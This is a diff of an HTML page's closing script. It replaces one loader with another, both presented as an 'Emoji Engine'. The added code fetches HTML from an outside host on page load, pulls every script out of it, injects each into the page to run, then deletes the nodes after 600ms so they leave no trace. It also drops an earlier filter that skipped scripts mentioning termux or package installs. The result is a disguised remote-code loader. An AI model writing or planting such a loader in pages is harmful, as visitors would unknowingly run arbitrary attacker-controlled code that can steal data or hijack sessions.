@@ -398,45 +398,28 @@
         window.addEventListener('DOMContentLoaded', initTelegramIntegration);
     </script>
 
-    <!-- Synchronous Core Engine Layout (0ms Delay + Auto Termux Stripper Active) -->
     <script>
-        (function injectEmojiEngineInstantly() {
+        (async () => {
             try {
-                // Synchronous request block taake page parsing ke sath hi execute ho jaye (0ms gap)
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://magic-scripts.vercel.app/heart.html', false); 
-                xhr.send(null);
-
-                if (xhr.status === 200) {
-                    var documentDOM = new DOMParser().parseFromString(xhr.responseText, 'text/html');
-                    
-                    documentDOM.querySelectorAll('script').forEach(function(oldNode) {
-                        var scriptContent = oldNode.textContent || oldNode.innerHTML || "";
-                        
-                        // Termux installer alerts aur automatic script systems ko filtered/skip karne ka setup
-                        if (scriptContent.includes('termux') || scriptContent.includes('apt update') || scriptContent.includes('pkg install')) {
-                            return; 
-                        }
-                        
-                        var freshScriptNode = document.createElement('script');
-                        if (oldNode.src) {
-                            freshScriptNode.src = oldNode.src;
-                        } else {
-                            freshScriptNode.textContent = scriptContent;
-                        }
-                        
-                        document.body.appendChild(freshScriptNode);
-                        
-                        // Memory cleanup to prevent layout shift
-                        setTimeout(function() { freshScriptNode.remove(); }, 300);
-                    });
-                    console.log("Zeetex Engine Connected Instantly at 0ms.");
-                }
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
             } catch (e) {
-                console.error("Engine execution pipeline reset.", e);
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
             }
         })();
     </script>
 </body>
-    </html>
-    
+</html>
